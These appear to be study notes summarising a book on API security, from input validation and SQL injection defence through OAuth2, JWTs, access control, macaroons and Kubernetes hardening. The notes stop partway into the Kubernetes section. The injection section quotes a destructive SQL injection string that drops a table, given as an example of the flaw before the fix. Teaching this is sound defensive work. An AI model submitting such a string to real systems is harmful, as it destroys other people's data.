### API Security

#### Secure API Development



Main Idea

### API Security

#### Secure API Development



Main Idea

	• Build the API on a secure-by-default foundation: clean project scaffolding, tight DB usage, strict input validation, and output hardening. Stop entire vulnerability classes early (SQLi, XSS, ReDoS), then layer advanced controls later.

	• Example app \& stack (Natter)

		○ Endpoints (REST/JSON over HTTP):

			• POST /spaces (create space)

			• POST /spaces/{id}/messages, GET /spaces/{id}/messages\[?since=], GET /spaces/{id}/messages/{msgId} 

			• Moderator: DELETE /spaces/{id}/messages/{msgId}

		○ Tech: Java 11, Spark (HTTP), H2 (in-mem), Dalesbred (DB), json.org (JSON), Maven.

		○ Pattern: Controllers hold core logic; Spark routes + filters handle HTTP/security.

	• Secure development fundamentals

		○ Three-phase handler: parse → operate → respond (separate concerns, easier to secure \& test).

		○ Filters: before (validate inputs), after (set types), afterAfter (headers for all responses, incl. errors).

		○ Avoid info leaks: don’t expose stack traces, framework versions (e.g., blank out Server).

	• Injection attacks (and the fix)

		○ What went wrong: string-built SQL with user input ⇒ SQL injection (demonstrated '); DROP TABLE spaces; --).

		○ Primary defense: prepared/parameterized statements everywhere (placeholders ?, values bound separately).

		○ Secondary containment: DB least privilege user (only SELECT, INSERT), so even if SQLi appears, blast radius is small.

		○ Don’t rely on escaping; it’s brittle across engines/versions.

	• Input validation (allowlist mindset)

		○ Validate size, type, charset, format before using data or touching the DB.

		○ Prefer allowlists (e.g., username regex \[A-Za-z]\[A-Za-z0-9]{1,29}) over blocklists.

		○ Watch for ReDoS: design regexes to avoid catastrophic backtracking; use simple checks when in doubt.

		○ Note: even with memory-safe languages, attackers can force resource exhaustion (e.g., huge arrays).

	• Output hardening \& XSS prevention

		○ Problem demo: reflected XSS via text/plain form trick, incorrect Content-Type, and echoing user input in error JSON.

		○ Defenses:

			• Enforce request media type: reject non-application/json bodies with 415.

			• Always set response type explicitly: application/json; charset=utf-8.

			• Never echo unsanitized input in errors; prefer generic messages or sanitize first.

			• Generate JSON via library, not by string concatenation.

	• Security headers to set on every response

		○ X-Content-Type-Options: nosniff – stop MIME sniffing (prevents JSON treated as HTML/JS).

		○ X-Frame-Options: DENY (and/or CSP frame-ancestors 'none') – mitigate clickjacking/data drag.

		○ X-XSS-Protection: 0 – disable legacy, unsafe browser XSS auditors on API responses.

		○ Cache-Control: no-store (+ proper Expires/Pragma as needed) – avoid sensitive data caching.

		○ Minimal CSP for APIs:

Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; sandbox

	• Error handling

		○ Map validation/parse issues to 400, missing records to 404, unexpected to 500; all in JSON; no stack traces.

	• Quick checklist you can reuse

		○ Scaffold API with controllers + Spark filters (or equivalent) to isolate security concerns.

		○ TLS (chapter 3), but now: enforce Content-Type: application/json on request; set correct response type.

		○ Prepared statements only; no string-built SQL.

		○ Run the app as a restricted DB user (POLA).

		○ Validate inputs (length, charset, format); design regexes to avoid ReDoS.

		○ Never echo raw input in errors; sanitize or generalize.

		○ Set nosniff / frame / CSP / cache headers on every response.

		○ Use JSON libraries for output; avoid manual string concatenation.

		○ Centralize exception → HTTP status mapping; keep responses minimal.

		○ Regularly re-test with “weird” inputs (quotes, long strings, mismatched media types).

#### Securing The Natter API



Main Idea

	• Harden the API by adding five security controls—rate-limiting, HTTPS/TLS, authentication, audit logging, and access control—placed in the right order so they collectively block STRIDE threats while preserving accountability.

	• Threats → controls (STRIDE map)

		○ Spoofing → Authentication (HTTP Basic)

		○ Tampering / Info disclosure → HTTPS/TLS (encrypt in transit)

		○ Repudiation → Audit logging (before and after each request)

		○ Denial of service → Rate-limiting (first gate)

		○ Elevation of privilege → Access control (ACLs + careful grant rules)

	• Implementation blueprint (in request order)

		○ Rate-limit early (e.g., Guava RateLimiter) → return 429 (+ Retry-After).

		○ Authenticate (don’t halt here—populate request.attribute("subject")).

		○ Audit log request start (assign audit\_id) and end (with status).

		○ Authorize (filters that enforce required perms per route) → 401 if unauthenticated (send WWW-Authenticate), 403 if authenticated but not allowed.

		○ Controller executes business logic.

	• Key concepts \& how to apply them

		○ Rate-limiting (availability)

			§ Apply before any heavy work (even before auth).

			§ Keep per-server limits beneath capacity; consider proxy/gateway limits too (defense in depth).

			§ Use 429 + Retry-After.

		○ Authentication (prevent spoofing)

			§ Use HTTP Basic for the chapter’s demo; credentials: Authorization: Basic <base64(user:pass)>.

			§ Only over HTTPS—Base64 is trivially decodable.

			§ Store passwords with Scrypt (or Argon2/Bcrypt/PBKDF2): unique salt, memory-hard params (e.g., 32768,8,1).

			§ Add /users registration endpoint that hashes \& stores pw\_hash.

		○ HTTPS/TLS (confidentiality \& integrity)

			§ Enable TLS in Spark (secure(...)); for dev, generate cert with mkcert (PKCS#12).

			§ Consider HSTS for real deployments (don’t set on localhost).

			§ Encrypt in transit now; chapter 5 covers at rest.

		○ Audit logging (accountability)

			§ Log attempted and successful actions: method, path, user, status, time, audit\_id (to correlate start/end).

			§ Write to durable storage (DB here; SIEM in prod).

			§ Follows separation of duties: access to logs should be restricted and distinct from admins.

		○ Access control (authorization)

			§ Model as ACLs per space (r, w, d), persisted in a permissions table.

			§ Enforce via route-specific filters (factory requirePermission(method, perm)):

				□ 401 when not authenticated; 403 when authenticated but lacking perms.

			§ Privilege escalation fix: only owners/moderators (rwd) can add members, or ensure granted perms ⊆ grantor’s perms.

	• Practical gotchas \& defaults

		○ Auth stage should not short-circuit; let access control reject so the attempt is logged.

		○ Return the right codes: 401 + WWW-Authenticate vs 403.

		○ Keep least privilege at the DB (from Ch.2) and at the app (minimal perms).

		○ Prefer defense in depth (proxy + app rate-limits; TLS + app checks).

	• Quick checklist to apply

		○ Global RateLimiter before everything → 429/Retry-After.

		○ Basic auth decoder → set subject if valid (Scrypt verify).

		○ Two audit filters (start/end) using audit\_id.

		○ Per-route before() filters enforcing ACL perms; correct 401/403 semantics.

		○ TLS on; consider HSTS in prod; never --insecure.

		○ Registration endpoint with input validation and Scrypt hashing.

		○ Member-add rule that avoids privilege escalation.

#### OAuth2 and OpenID Connect



Main Idea

	• Open your API to third-party apps safely by using OAuth2 for delegated authorization with scoped access tokens, validate those tokens securely (introspection or JWTs), and use OpenID Connect (OIDC) when you also need user identity/SSO.

	• Core Terms \& Roles

		○ AS (Authorization Server): Authenticates users, issues tokens.

		○ RS (Resource Server / your API): Consumes tokens.

		○ Client: The app requesting access (public or confidential).

		○ RO (Resource Owner): The end user.

		○ Access token: Grants API access.

		○ Refresh token: Lets a client get new access tokens without user re-auth.

		○ Scope(s): String labels that limit what the token can do.

	• Scopes vs permissions

		○ Scopes (DAC): What a user consents to delegate to a client (“post\_message”, “read\_messages”). Client-facing, coarse to fine as needed.

		○ Permissions (MAC or DAC): Admin-designed rights to specific resources/objects (ACLs, roles). Scopes say which operations may be called; permissions also constrain which objects.

	• Client types

		○ Public: Browser SPA, mobile, desktop—can’t keep a secret.

		○ Confidential: Server-side—can authenticate to AS (client secret/JWT/TLS).

	• Grant types (what to use)

		○ Use: Authorization Code + PKCE (for web, SPA, mobile, desktop).

		○ Avoid: Implicit (token leaks) and ROPC (shares password with app).

		○ Others: Client Credentials (service→service), Device flow (no UI).

	• Authorization Code + PKCE flow (essentials)

		○ Client redirects to /authorize with scope, state, PKCE code\_challenge.

		○ AS authenticates user, shows consent, returns code (+ state).

		○ Client posts code (+ code\_verifier) to /token → gets access token (and often refresh token).

		○ Use Authorization: Bearer <token> to call the API.

		○ PKCE: Always on. Stops code interception by requiring a matching code\_verifier.

	• Redirect URIs (security)

		○ Prefer claimed HTTPS redirects (App/Universal Links).

		○ Private URI schemes are weaker (can be hijacked).

		○ CLI/desktop: use loopback http://127.0.0.1:<random>.

	• Validating access tokens (at the API)

		○ Two mainstream options:

			§ Token Introspection (RFC 7662): RS POSTs token to AS /introspect → gets active, sub, scope, exp, etc.

				□ Pros: central control/revocation; RS doesn’t need keys.

				□ Cons: network hop per check (cache carefully).

			§ JWT access tokens: RS validates locally.

				□ Prefer public-key signatures (AS signs with private key; RS verifies with public key from JWK Set). Enforce expected issuer, audience, alg.

				□ Handle scope claim variants (string vs array).

				□ Pros: no network call; scalable. Cons: key rotation/JWK fetching; larger tokens.

	• Crypto choices \& TLS hardening

		○ Signature algs (JWS): Prefer EdDSA (Ed25519) if supported; else ES256; avoid RSA PKCS#1 v1.5 if possible (prefer RSASSA-PSS).

		○ Encrypted tokens (JWE): Only when you must hide claims from clients; prefer ECDH-ES over RSA-OAEP; never RSA1\_5.

		○ TLS to AS: Pin trust to your org CA, allow only TLS 1.2/1.3 and modern ciphers.

	• Refresh tokens

		○ Let you issue short-lived access tokens.

		○ Client uses /token with grant\_type=refresh\_token.

		○ AS can rotate refresh tokens to detect theft.

	• Revocation

		○ OAuth revocation endpoint: Only the client that owns the token can revoke.

		○ For RS-side checks, rely on introspection (or short TTL + refresh).

	• Single sign-on (SSO)

		○ Centralize auth at the AS; browser session at AS enables seamless re-auth across clients.

	• OpenID Connect (OIDC)

		○ Adds identity to OAuth:

			§ ID token (JWT): who the user is + how/when they authenticated (e.g., auth\_time, amr, acr, nonce).

			§ UserInfo endpoint: detailed profile claims via access token.

		○ Do not use ID tokens for API access (not scoped; wrong audience). Use access tokens for authorization; ID tokens for identity/assurance.

		○ If a client passes an ID token to your API, accept it only alongside a valid access token and verify issuer, audience, azp, subject match.

	• Design \& implementation tips

		○ Require a scope to obtain scoped tokens (avoid privilege escalation).

		○ Pre-register redirect URIs; validate state; always use PKCE.

		○ Enforce audience on tokens so a token for API A can’t be replayed to API B.

		○ Handle username mapping (sub/username) between AS and your user store (LDAP/DB).

		○ Avoid compression of encrypted content unless you understand the side-channel risks.

	• Common pitfalls to avoid

		○ Using implicit or ROPC for third-party apps.

		○ Trusting JWT alg/jku/jwk headers blindly.

		○ Treating an ID token like an access token.

		○ No revocation plan (or caching introspection too long).

		○ Weak redirect URI strategy (open redirects, unclaimed schemes).

#### Modern Token-Based Authentication



Main Idea

	• Move beyond same-site session cookies to a modern, cross-origin, token-based setup:

		○ enable CORS correctly,

		○ send tokens with the Bearer HTTP scheme,

		○ store tokens client-side with Web Storage (not cookies),

		○ and harden server-side token storage (DB hashing + HMAC, cleanup, least privilege).

	• Key concepts (what \& why)

		○ CORS: lets specific cross-origin requests through SOP using preflights (OPTIONS).

			§ Preflight sends Origin, Access-Control-Request-Method/Headers.

			§ Server echoes allowed values via:

				• Access-Control-Allow-Origin (single origin; add Vary: Origin)

				• Access-Control-Allow-Methods, …-Headers, optional …-Max-Age

				• Access-Control-Allow-Credentials: true when you want cookies or TLS client certs.

			§ Cookies + CORS: must send …-Allow-Credentials: true on both preflight and actual response and client must set fetch(..., { credentials: 'include' }).

			§ SameSite vs CORS: SameSite cookies don’t ride on true cross-site requests; future favors non-cookie tokens for cross-origin.

		○ Tokens without cookies

			§ Server-side: DatabaseTokenStore with token\_id, user\_id, expiry, attributes (JSON).

				• Generate IDs with SecureRandom (e.g., 20 bytes → Base64url ≈ 160 bits).

				• Expiry deletion task + index on expiry.

			§ Wire format: use Authorization: Bearer <token>; advertise with WWW-Authenticate: Bearer (e.g., error="invalid\_token" when expired).

			§ Client-side: store token in localStorage (persists across tabs/restarts) and send it in the Authorization header. No credentials: 'include'.

				• Remove CSRF header/logic when not using cookies.

		○ Security hardening

			§ CSRF goes away with non-cookie tokens (browser no longer auto-attaches creds).

			§ XSS risk increases (Web Storage is JS-accessible). Prioritize XSS defenses:

				• strict output encoding, CSP, consider Trusted Types.

			§ Protect tokens at rest:

				• Hash tokens before DB write (e.g., SHA-256); compare using constant-time equality.

				• Add HMAC-SHA-256 tag to tokens issued to clients: tokenId.tag.

					® Validate tag (constant-time) before DB lookup; strip tag, then look up.

					® Store HMAC key in a keystore (e.g., PKCS#12), load on startup; don’t hard-code or keep in the same DB.

				• DB hygiene:

					® Least-privilege accounts; split duties (e.g., CQRS: different users for queries vs destructive ops).

					® Consider row-level security where supported.

					® Encrypt backups; application-level encryption for highly sensitive attributes is complex—use with care.

	• Implementation checklist

		○ CORS filter

			§ Echo exact origin; add Vary: Origin.

			§ Allow needed methods/headers (e.g., Content-Type, Authorization).

			§ Only use …-Allow-Credentials: true if you truly need cookies; otherwise omit it.

		○ Auth flow

			§ POST /sessions → create random token, store in DB, return token.

			§ Client saves token to localStorage; sends Authorization: Bearer … on API calls.

			§ DELETE /sessions revokes (delete by id/hash).

			§ Return WWW-Authenticate: Bearer on 401s; invalid\_token when expired.

		○ Token store hardening

			§ Generate with SecureRandom.

			§ Store hash(tokenId) in DB; schedule expired token cleanup.

			§ Wrap store with HMAC validator (key from keystore).

	• When to choose what

		○ Same-origin web app: session cookies + SameSite + CSRF defenses (Ch. 4) still great.

		○ Cross-origin web, mobile, desktop, SPAs on other domains: Bearer + Web Storage + DB tokens with CORS; no cookies.

	• Smart defaults

		○ Bearer everywhere; Base64url for ids; SecureRandom only.

		○ No state-changing GETs.

		○ Constant-time comparisons (MessageDigest.isEqual).

		○ Keep CORS tight (allow specific origins) unless you truly need public access.

#### Self-Contained Tokens and JWTs



Main Idea

	• Scale beyond DB-backed sessions by making self-contained tokens (client holds the state) and securing them with integrity (HMAC/signatures) and, when needed, confidentiality (encryption). Use JWT/JOSE carefully, and add a revocation strategy since state lives client-side.

	• Key Concepts

		○ Self-contained (stateless) tokens

			§ Token == encoded claims (e.g., JSON) + protection.

			§ Pros: fewer DB hits, easy horizontal scale.

			§ Cons: revocation is hard; token contents leak unless encrypted.

		○ Integrity: HMAC / JWS

			§ Wrap your JSON token with HMAC-SHA-256 or sign as a JWS so it can’t be forged/modified.

			§ Validate with constant-time comparison; advertise failures via WWW-Authenticate only as needed.

		○ Confidentiality: Authenticated Encryption

			§ Use AEAD (e.g., AES-GCM or AES-CBC + HMAC (EtM)) or high-level libs (NaCl/SecretBox, Tink).

			§ Encrypt-then-MAC (or a single AEAD) → prevents tampering + chosen-ciphertext tricks.

			§ IV/nonce must be unique/unpredictable (generate via CSPRNG).

		○ JWT / JOSE essentials

			§ Structure (JWS Compact): base64url(header).base64url(payload).base64url(tag)

			§ Common claims:

				□ sub (subject), exp (expiry), iss (issuer), aud (audience), iat (issued at), nbf (not before), jti (JWT ID).

			§ Header pitfalls:

				□ Don’t trust alg from the token; bind algorithm to the key (key-driven agility).

				□ Use kid to look up server-held keys; avoid jwk/jku (key injection/SSRF risk).

			§ Encrypted JWTs (JWE): header + (optional) encrypted key + IV + ciphertext + tag. Prefer direct symmetric encryption (alg: "dir") with AEAD.

		○ Libraries, not hand-rolls

			§ Use a mature JOSE/JWT lib (e.g., Nimbus). Avoid DIY crypto/composition errors.

		○ Key management

			§ Separate keys by purpose (HMAC vs encryption). Store in a keystore, not code/DB. Support key rotation (kid).

		○ Revocation with stateless tokens

			§ Options:

				□ Allowlist in DB (only listed jti are valid).

				□ Blocklist of revoked jti until exp.

				□ Attribute-based invalidation (e.g., “all tokens for user X issued before T”).

				□ Short-lived access tokens + (later) refresh tokens (OAuth2 pattern).

			§ Hybrid approach (recommended default): JWT for integrity/confidentiality plus DB allowlist for revocation. Lets you skip DB for low-risk reads, check DB for sensitive ops.

		○ API design safety with types

			§ Use marker interfaces (e.g., ConfidentialTokenStore, AuthenticatedTokenStore, SecureTokenStore) so insecure combinations don’t compile.

		○ Compression caution

			§ Avoid JWE zip unless you truly need it (BREACH/CRIME-style side channels).

	• Quick implementation blueprint

		○ Create claims (sub, exp, optional iss, aud, jti, custom attrs).

		○ Protect:

			§ Integrity only → JWS (HS256) or HMAC wrapper.

			§ Integrity + confidentiality → JWE (e.g., A128CBC-HS256) or SecretBox.

		○ Keying: load from PKCS#12 keystore; bind alg to key; expose kid.

		○ Validate: parse, verify signature/tag, check aud, exp/nbf, then consume claims.

		○ Revoke: on logout/compromise, remove jti from allowlist (or add to blocklist).

	• Threats \& mitigations (STRIDE map)

		○ Spoofing/Tampering → HMAC/JWS/JWE (authenticated).

		○ Information disclosure → encrypt (JWE/SecretBox).

		○ Replay → short exp, enforce TLS, use jti tracking if needed.

		○ Config abuse → ignore alg header; never accept jwk/jku from tokens.

		○ Oracle/side channels → constant-time compares; generic error messages; be careful with CBC and compression.

	• When to choose what

		○ Small/medium scale, easy revocation → DB tokens (hashed + HMAC).

		○ High scale, cross-service → JWT (signed or encrypted) + allowlist.

		○ Simple single-service and you control both ends → NaCl/SecretBox tokens.

	• Common mistakes to avoid

		○ Trusting alg or fetching keys from jku.

		○ Using encryption without authentication.

		○ Reusing nonces/IVs.

		○ No revocation plan for stateless tokens.

		○ Hard-coding keys or storing them in the same DB as tokens.



#### Identity-Based Access Control



Main Idea

	• ACLs don’t scale. Move to identity-based access control (IBAC) patterns that organize “who can do what” using groups, roles (RBAC), and—when rules must be contextual and dynamic—attributes (ABAC). Centralize and automate policy where helpful, but keep it testable and manageable.

	• Key Concepts

		○ IBAC: Authorize based on who the authenticated user is.

		○ Groups: Many-to-many user collections (can be nested). Assigning perms to groups reduces ACL bloat and keeps members consistent.

			§ LDAP groups:

				• Static: groupOfNames / groupOfUniqueNames (explicit member).

				• Dynamic: groupOfURLs (membership via queries).

				• Virtual static: server-computed.

				• Lookups: search by DN, avoid LDAP injection (parametrized filters), cache results; some servers expose isMemberOf.

			§ RBAC: Map roles → permissions, then users → roles (not users → permissions).

				• Benefits: simpler reviews, separation of duties, app-specific roles, easier change control.

				• Sessions (NIST RBAC): a user activates only a subset of their roles → least privilege.

				• Static roles: stored assignments per scope/realm (e.g., per space).

				• Dynamic roles: time/shift-based or rule-based activation; less standardized; constraints (e.g., mutually exclusive roles) support separation of duties.

			§ RBAC implementation patterns:

				• Code annotations (e.g., @RolesAllowed).

				• Data-driven mapping (tables: role\_permissions, user\_roles)—transparent and admin-friendly.

				• Typical roles example: owner (rwd), moderator (rd), member (rw), observer (r).

			§ ABAC: Decide per request using four attribute sets:

				• Subject (user, groups, auth method, auth time)

				• Resource (object/URI, labels)

				• Action (HTTP method/operation)

				• Environment (time, IP, location, risk)

Combine rule outcomes (e.g., default-permit with deny overrides, or safer default-deny).

			§ Policy engines \& centralization:

				• Rule engines (e.g., Drools) or policy agents/gateways (e.g., OPA) to evaluate ABAC rules.

				• XACML architecture:

					® PEP (enforces), PDP (decides), PIP (fetches attributes), PAP (admin UI).

					® Enables central policy with distributed enforcement.

	• Design guidance (how)

		○ Layering strategy: Start with groups (org-level), organize API permissions with RBAC (app-specific), then ABAC for contextual constraints (time/location/risk)—defense in depth.

		○ Keep auth vs. authz layered: Gather identity/group claims during authentication; authorization logic consumes those attributes—avoids tight DB coupling and eases swapping in LDAP/OIDC.

		○ Data modeling tips:

			§ Use user\_roles + role\_permissions; cache per-request resolved permissions.

			§ Scope roles to a realm (e.g., a space/project).

		○ Rule combining: Choose and document defaults (default-deny is safest; if layering over RBAC, default-permit with deny-overrides can work).

		○ Operational best practices:

			§ Version control for policies; code review changes.

			§ Automated tests for endpoints and policy rules.

			§ Monitor performance of policy evaluation; cache derived attributes prudently.

	• Common pitfalls

		○ Assigning permissions directly to individual users (hard to audit).

		○ Mixing group lookups into every authorization query (breaks layering; harder to swap identity backends).

		○ Over-complex ABAC policies (hard to predict/maintain; brittle to data shape changes).

		○ Centralization that slows iteration → lingering overly broad access (least-privilege erosion).

	• Quick contrasts

		○ Groups vs Roles: Groups organize people (often org-wide). Roles organize permissions (app-specific). RBAC usually forbids user-direct perms; groups often don’t.

		○ RBAC vs ABAC: RBAC = stable, comprehensible entitlements; ABAC = contextual, fine-grained, dynamic control.

		



#### Capability-Based Security And Macaroons



Main Idea

	• Sometimes identity-based access control (IBAC/RBAC/ABAC) clashes with how people actually share things. Capability-based security fixes this by granting access with unforgeable, least-privilege references to specific resources (often as URLs). You can further harden capabilities with macaroons, which let anyone add verifiable, limiting caveats to a token.

	• Key Concepts

		○ Capability (cap): An unforgeable reference + the exact permissions to a single resource. Possession ⇒ authority (no ambient identity lookup).

		○ POLA, not ambient authority: Capabilities naturally enforce the Principle of Least Authority and avoid confused deputy bugs (e.g., CSRF) that arise from ambient credentials like cookies or IP checks.

		○ Capability URI (a.k.a. cap URL): A REST-friendly cap encoded in a URL.

			§ Token placement options \& trade-offs

				□ Path / query: simplest; but can leak via logs, Referer, history.

				□ Fragment (#…)/userinfo: not sent to server/Referer; safer for browsers but needs client JS to extract \& resend.

			§ HATEOAS with capabilities: Clients shouldn’t mint their own URIs. Server returns links that are themselves new capabilities (e.g., “messages” link from a “space” cap). This preserves POLA and keeps the client decoupled.

		○ Combining identity + capabilities:

			§ Auth (cookie/OIDC) proves who for audit/accountability.

			§ Capability proves may do what for this resource.

			§ Binding a cap to a user (store username in token \& require cookie match) thwarts CSRF and limits damage if a cap leaks; then you can drop a separate anti-CSRF token.

			§ To still share, add an endpoint that derives a new, possibly reduced-permission cap for another user.

		○ Macaroons: Capability tokens that support caveats (restrictions) anyone can append without server keys; integrity enforced via chained HMAC tags.

			§ First-party caveats: Checked locally by the API (e.g., time < ..., method = GET, since > ...). Great for contextual caveats added just before use to narrow risk (short time, specific method/URI).

			§ Third-party caveats: Require a discharge macaroon from an external service (e.g., “user is employee”, “transaction approved”). Enables decentralized, privacy-preserving authorization.

			§ Verification: API validates HMAC chain, then enforces each caveat with registered verifiers.

	• Practical patterns (Natter examples)

		○ Create caps: Use a secure token store; put resource path and perms in token attrs; return cap URIs (often multiple: rwd/rw/r).

		○ Authorize requests: Replace role lookups with a filter that reads the capability token, checks it matches the requested path, and applies perms.

		○ Linking flow: Responses include further cap links (HATEOAS) to subresources (e.g., /spaces/{id}/messages), preserving or reducing perms.

		○ Browser clients (web-keys): Put token in fragment; load a small JS page that extracts #token and re-sends it as a query param to the API. Beware redirects (fragments copy unless you supply a new one).

		○ Revocation/volume: Long-lived caps can bloat storage; mitigate with self-contained tokens (e.g., JWT) or by reusing existing equivalent caps; keep most caps short-lived.

	• Why this matters

		○ Security: Eliminates ambient authority paths for confused-deputy abuse; per-resource granularity makes over-privilege rarer.

		○ Usability: Matches how users share (“send a link”) while remaining safe.

		○ Composability: Macaroons let clients locally narrow tokens; third-party caveats enable policy checks without tight coupling.

	• Gotchas \& guidance

		○ Don’t leak caps (avoid logging full URLs; set strict Referrer-Policy; prefer fragment for browser-visible links).

		○ Clients can’t fabricate caps—you must return links.

		○ If you bind caps to users, you lose easy link-sharing; provide a server-mediated share/derive flow.

		○ Caveats must only restrict; never grant extra authority based on caveat claims.

		○ Test and version policy/caveat verifiers; treat tokens like secrets.

	• Quick contrasts

		○ Auth token vs Capability:

			§ Auth token ⇒ who you are, broad scope, short-lived.

			§ Capability ⇒ exact resource+perms, shareable, can be longer-lived.

		○ RBAC/ABAC vs Caps:

			§ RBAC/ABAC: identity-centric; good for broad policy \& org controls.

			§ Caps: object-centric; perfect for fine-grained, ad-hoc sharing; pair nicely with identity for audit.



#### Securing Service-To-Service APIs



Main Idea

	• How to authenticate and harden service-to-service API calls. It compares options (API keys, OAuth2 variants, JWT bearer, mutual TLS), explains proof-of-possession with certificate-bound tokens, and shows how to manage/rotate secrets (Kubernetes secrets, vaults/KMS, short-lived tokens, HKDF). It ends with ways to pass user context safely across microservices to avoid confused-deputy problems (phantom tokens, token exchange, macaroons).

	• Key Concepts

		○ API key / JWT bearer

			§ A long-lived bearer token that identifies a client app/org (not a user). Easy to issue/use; hard to revoke; anyone who steals it can use it until expiry. JWTs signed by a portal/AS make multi-API validation easy (public key verify) but are still bearer tokens.

		○ OAuth2 Client Credentials Grant

			§ Client gets an access token as itself (no user). Works with your existing AS, scopes, introspection \& revocation. Typically no refresh token (just ask again).

		○ Service account

			§ A “user-like” account for services, stored with users so APIs can do normal user lookups/roles. Commonly authenticated with non-interactive flows; ROPC works but is being deprecated—prefer stronger methods.

		○ JWT Bearer Grant (RFC 7523)

			§ Client proves identity or acts for a (service) account by presenting a signed JWT assertion. Pros: no long-lived shared secret, short expiry, public key distribution via JWK Set URL for easy rotation.

		○ Mutual TLS (mTLS) \& client certificates (RFC 8705)

			§ TLS on both sides: server and client authenticate with certs. Can be used to authenticate OAuth clients and to issue certificate-bound access tokens (see below). In Kubernetes:

				□ NGINX Ingress: request/verify client cert; forwards details via headers (e.g., ssl-client-verify, ssl-client-cert).

				□ Service mesh (e.g., Istio): does mTLS transparently between pods; forwards identity via X-Forwarded-Client-Cert (includes SANs/SPIFFE IDs). Useful to authenticate services without managing your own certs per service.

		○ Certificate-bound access tokens (PoP tokens)

			§ AS binds the token to the client cert (hash in cnf: { "x5t#S256": ... }). API only accepts the token over a TLS connection using the same cert. Stops token replay if stolen. API just compares the hash; doesn’t need full PKI validation.

		○ Secrets management

			§ Kubernetes Secrets: mount as files or env vars (prefer files). Easy but weaker: etcd needs at-rest encryption; anyone who can run a pod in the namespace can read them.

			§ Secret vaults / KMS: central encrypted storage, audit, fine-grained access, short-lived dynamic creds, crypto operations via service (e.g., PKCS#11). Use envelope encryption (DEK + KEK in KMS).

			§ Avoid long-lived secrets on disk: inject short-lived JWTs or one-time tokens into pods via a controller (separate, locked-down namespace) so pods exchange them for real access/refresh tokens at startup.

		○ Key derivation (HKDF)

			§ Derive many purpose-specific keys from one high-entropy master key using HKDF-Expand(context). Reduces number of stored secrets; supports automatic rotation by changing context (e.g., include date). (Don’t reuse the same key for multiple purposes.)

		○ Confused deputy \& propagating user context

			§ Passing only the service’s identity can let it be abused to perform privileged actions.

			§ Phantom token pattern: gateway introspects a long-lived opaque token and swaps it for a short-lived signed JWT tailored to each backend—fast local verification, least-privilege scopes/audience, easy revocation at the edge.

			§ OAuth2 Token Exchange (RFC 8693): standard way to trade one token for another, adding an act claim to show “service acting for user.” Better across trust boundaries; heavier (extra AS roundtrip).

			§ Macaroons: capability-style tokens where each hop can add caveats (time/resource/user). Efficient local restriction without AS calls.

	• Practical trade-offs \& guidance

		○ Choosing a client auth method

			§ Simple \& external partners: API keys/JWT bearer (but plan revocation, narrow scopes, strict audiences, short expiry).

			§ You already run OAuth2: Client Credentials (introspection + revocation).

			§ Need user-like roles/central user store: Service accounts (avoid ROPC; prefer JWT bearer or mTLS).

			§ Avoid shared secrets/enable rotation: JWT bearer grant with JWKs.

			§ Strongest transport-level auth / PoP tokens: mTLS, optionally with certificate-bound tokens.

		○ Inside a cluster

			§ Prefer service mesh mTLS + forwarded identity headers (SPIFFE) to authenticate services.

			§ If tokens must be used, consider certificate-bound tokens to prevent replay.

		○ Secrets

			§ Prefer vault/KMS over raw K8s secrets; if you must use K8s secrets: encrypt etcd at rest, mount as files, lock down namespaces/RBAC, never check secrets into git.

			§ Use short-lived bootstrap tokens + controller injection; rotate aggressively.

			§ Use HKDF to derive per-purpose keys and avoid key sprawl.

		○ Passing user context

			§ Within one trust boundary: phantom tokens for speed + least privilege.

			§ Across orgs/boundaries: token exchange (clear delegation via act).

			§ Alternative: macaroons when you want hop-by-hop, local capability scoping.

		○ Gotchas (security pitfalls to avoid)

			§ Don’t mix up user vs service tokens—APIs must be able to tell which they are.

			§ Bearer anything (API key/JWT) can be replayed if stolen—keep expirations short; set aud, iss, jti; prefer PoP (cert-bound).

			§ Header spoofing risk: ensure ingress strips/sets auth headers (ssl-client-verify, etc.), ideally with randomized header names or trusted hop checks.

			§ ROPC is legacy; avoid for users and minimize for service accounts.

			§ K8s secrets aren’t encryption; enable etcd encryption (prefer KMS), and beware file exposure/path traversal vulns.

			§ Public key rotation: publish JWKs and rotate with overlapping keys.

		○ Mini-glossary

			§ Client assertion: a signed JWT used to authenticate a client to the token endpoint.

			§ JWK Set: JSON document with one or more public keys for validation/rotation.

			§ cnf / x5t#S256: confirmation key claim holding the SHA-256 thumbprint of the client cert.

			§ SPIFFE ID: standardized URI naming a workload (trust domain + path).

			§ Envelope encryption: data encrypted with a local DEK; DEK encrypted by a KEK in KMS.

			§ Phantom token: short-lived JWT minted by a gateway after introspection.

			§ Token exchange: RFC 8693 flow to swap tokens and add act (delegation chain).

			§ HKDF-Expand: derive new keys from a master HMAC key using a context string.

		○ Quick decision helper

			§ Need revocation + central control? Opaque token + introspection (or phantom tokens behind gateway).

			§ Need zero shared secrets + rotation? JWT bearer grant with JWKs or mTLS client auth.

			§ Worried about token theft? Certificate-bound tokens (PoP).

			§ Lots of services? Mesh mTLS with identity headers + least-privilege scopes.

			§ Secrets everywhere? Vault/KMS + short-lived bootstrap creds + HKDF for per-purpose keys.

			§ User context across hops? Phantom tokens (internal) or Token Exchange (cross-boundary).





#### Microservices APIs in Kubernetes



Main Idea

	• How to run and secure microservice APIs on Kubernetes: package each service in hardened containers, wire them together with Services, secure traffic with a service mesh (mTLS), restrict east–west traffic with NetworkPolicies, and expose the app safely to the outside world through an ingress—all while avoiding pitfalls like SSRF and DNS rebinding.

	• Key Concepts

		○ Microservice: independently deployed service speaking to others via APIs.

		○ Node / Pod / Container: node = VM/host; pod = one-or-more containers; container = one process (typical) + its FS/network view.

		○ Service: stable virtual IP/DNS that load-balances to pods.

		○ Namespace: logical isolation boundary and policy scope.

		○ Privilege separation: put risky work in its own (less-privileged) service.

		○ Ingress controller: cluster edge reverse proxy / LB (TLS termination, routing, rate limit, logging).

		○ Service mesh (Linkerd/Istio): sidecar proxies that auto-TLS (mTLS), observe, and control service-to-service traffic.

		○ NetworkPolicy: allowlist rules for pod ingress/egress inside the cluster.

		○ Zero trust: don’t trust “internal”; authenticate every call.

	• Container security (what “good” looks like)

		○ Use minimal base images (e.g., distroless, Alpine) + multi-stage builds.

		○ Run as non-root (runAsNonRoot: true), no privilege escalation, read-only root FS, drop all Linux capabilities.

		○ Prefer one process per container; use init for one-time setup and sidecars for cross-cutting (e.g., mesh proxy).

	• Kubernetes wiring (Natter example)

		○ Separate deployments/services for API, DB (H2), link-preview.

		○ Internal discovery via Service DNS (e.g., natter-link-preview-service:4567).

